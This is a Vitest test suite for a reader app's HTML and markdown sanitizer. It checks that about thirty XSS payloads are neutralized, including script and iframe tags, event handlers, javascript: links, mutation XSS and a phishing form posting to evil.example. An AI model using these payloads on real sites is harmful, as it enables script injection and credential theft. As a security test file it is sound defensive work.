// @vitest-environment jsdom
import { describe, expect, it } from 'vitest';
import { sanitizeHtml } from '../../src/reader/sanitize';
import { render } from './reader-helpers';

const DANGEROUS_TAGS = 'script, iframe, object, embed, style, form, input, button, textarea, select, base, meta, link, frame, frameset';
const URL_ATTRS = ['href', 'src', 'action', 'formaction', 'xlink:href', 'srcset', 'data', 'poster'];

/** Fails if anything in the DOM could run code, load active content or restyle the page. */
function expectSafe(root: ParentNode) {
  expect(root.querySelectorAll(DANGEROUS_TAGS)).toHaveLength(0);
  for (const element of root.querySelectorAll('*')) {
    for (const attr of element.attributes) {
      expect(attr.name, `<${element.tagName.toLowerCase()} ${attr.name}>`).not.toMatch(/^on/i);
      expect(attr.name).not.toBe('style');
      if (URL_ATTRS.includes(attr.name)) {
        const value = attr.value.replace(/[\u0000- ]+/g, '').toLowerCase();
        expect(value, `${attr.name}="${attr.value}"`).not.toMatch(/^(javascript|vbscript):/);
        // inline data is only acceptable as a real image
        if (value.startsWith('data:')) expect(value).toMatch(/^data:image\/(png|jpe?g|gif|webp|avif|svg\+xml)[;,]/);
      }
    }
  }
  expect(root.querySelectorAll('svg, math')).toHaveLength(0);
}

const attacks: Record<string, string> = {
  'script tag': '<script>alert(1)</script>',
  'script with src': '<script src="https://evil.example/x.js"></script>',
  'img onerror': '<img src=x onerror=alert(1)>',
  'img onerror (quoted, uppercase)': '<IMG SRC="x" ONERROR="alert(1)">',
  'markdown javascript: link': '[click](javascript:alert(1))',
  'markdown javascript: link (mixed case)': '[click](JaVaScRiPt:alert(1))',
  'markdown javascript: link (entity-encoded)': '[click](&#106;avascript:alert(1))',
  'markdown javascript: link (angle brackets)': '[click](<javascript:alert(1)>)',
  'markdown vbscript: link': '[click](vbscript:msgbox(1))',
  'markdown javascript: image': '![x](javascript:alert(1))',
  'raw javascript: href': '<a href="javascript:alert(1)">x</a>',
  'raw javascript: href with whitespace': '<a href="  jav&#x09;ascript:alert(1)">x</a>',
  'raw data:text/html href': '<a href="data:text/html,<script>alert(1)</script>">x</a>',
  'raw data:text/html image': '<img src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">',
  iframe: '<iframe src="https://evil.example"></iframe>',
  'iframe srcdoc': '<iframe srcdoc="<script>alert(1)</script>"></iframe>',
  'svg onload': '<svg onload=alert(1)><circle r="1"/></svg>',
  'svg script': '<svg><script>alert(1)</script></svg>',
  'math href': '<math><mi xlink:href="javascript:alert(1)">x</mi></math>',
  'style tag': '<style>body{display:none}</style>',
  'style attribute': '<p style="position:fixed;inset:0;background:red">x</p>',
  'event handlers on any tag': '<div onclick="alert(1)" onmouseover="alert(2)" onfocus="alert(3)" tabindex="0">hi</div>',
  'link with onclick': '<a href="https://example.com" onclick="alert(1)">x</a>',
  'object and embed': '<object data="x.swf"></object><embed src="x.swf">',
  'form and inputs (phishing)': '<form action="https://evil.example"><input name="password"><button>Log in</button></form>',
  'meta refresh and base': '<meta http-equiv="refresh" content="0;url=https://evil.example"><base href="https://evil.example/">',
  'link stylesheet': '<link rel="stylesheet" href="https://evil.example/x.css">',
  'details ontoggle': '<details open ontoggle=alert(1)>x</details>',
  'video onerror': '<video><source onerror="alert(1)"></video>',
  'mutation XSS (noscript)': '<noscript><p title="</noscript><img src=x onerror=alert(1)>">',
  'mutation XSS (svg/style)': '<svg></p><style><a id="</style><img src=1 onerror=alert(1)>">',
  'nested/obfuscated script': '<scr<script>ipt>alert(1)</scr</script>ipt>',
};

describe('sanitization (XSS protection)', () => {
  for (const [name, markdown] of Object.entries(attacks)) {
    it(`neutralizes: ${name}`, () => {
      expectSafe(render(markdown).element);
    });
  }

  it('does not let a malicious book run code when inserted into the page', () => {
    const w = window as unknown as { __pwned?: boolean };
    w.__pwned = undefined;
    const { element } = render(Object.values(attacks).join('\n\n'));
    document.body.append(element);
    expect(w.__pwned).toBeUndefined();
    element.remove();
  });

  it('shows markdown "javascript:" links as plain text, not as links', () => {
    const { element } = render('[click](javascript:alert(1))');
    expect(element.querySelector('a')).toBeNull();
    expect(element.textContent).toContain('click');
  });

  it('keeps script source inside code blocks as inert text', () => {
    const { element } = render('```html\n<script>alert(1)</script>\n<img src=x onerror=alert(1)>\n```');
    expect(element.querySelector('script, img')).toBeNull();
    expect(element.querySelector('pre code')?.textContent).toContain('<script>alert(1)</script>');
  });

  it('removes ids and names set by the author (DOM clobbering) but keeps the headings\' generated ids', () => {
    const { element } = render('<img src="https://example.com/x.png" name="cookie" id="body" alt="x">\n\n## Links');
    const img = element.querySelector('img')!;
    expect(img.hasAttribute('id')).toBe(false);
    expect(img.hasAttribute('name')).toBe(false);
    expect(element.querySelector('h2')?.id).toBe('links');
    expect([...element.querySelectorAll('[id]')].map((e) => e.tagName)).toEqual(['H2']);
  });

  it('drops data-* attributes written by the author', () => {
    const { element } = render('<p data-testid="book-content" data-x="1">x</p>');
    const attributes = [...element.querySelector('p')!.attributes].map((a) => a.name);
    expect(attributes.filter((name) => name.startsWith('data-'))).toEqual([]); // (only Folium's own class may be there)
  });

  it('keeps safe formatting, safe links and https images', () => {
    const { element } = render(
      '**b** <kbd>K</kbd> [ok](https://example.com) [mail](mailto:me@example.com) ![alt](https://example.com/a.png "T")',
    );
    expect(element.querySelector('strong')).not.toBeNull();
    expect(element.querySelector('kbd')).not.toBeNull();
    expect(element.querySelector('a[href="https://example.com"]')).not.toBeNull();
    expect(element.querySelector('a[href="mailto:me@example.com"]')).not.toBeNull();
    expect(element.querySelector('img')?.getAttribute('src')).toBe('https://example.com/a.png');
    expect(element.querySelector('img')?.getAttribute('title')).toBe('T');
  });

  it('opens external links in a new tab without giving them access to the opener', () => {
    const { element } = render('[ext](https://example.com) <a href="http://example.org">raw</a> [mail](mailto:a@b.c)');
    const [markdownLink, rawLink, mail] = [...element.querySelectorAll('a')];
    for (const link of [markdownLink, rawLink]) {
      expect(link.getAttribute('target')).toBe('_blank');
      expect(link.getAttribute('rel')).toBe('noopener noreferrer');
    }
    expect(mail.hasAttribute('target')).toBe(false);
  });

  it('removes target attributes written by the author on internal links', () => {
    const { element } = render('<a href="#x" target="_blank">x</a>');
    expect(element.querySelector('a')?.hasAttribute('target')).toBe(false);
  });
});

describe('sanitizeHtml', () => {
  it('returns an inert fragment that is safe to insert', () => {
    const fragment = sanitizeHtml('<p onclick="x()">hi</p><script>alert(1)</script>');
    const holder = document.createElement('div');
    holder.append(fragment);
    expect(holder.innerHTML).toBe('<p>hi</p>');
  });
});
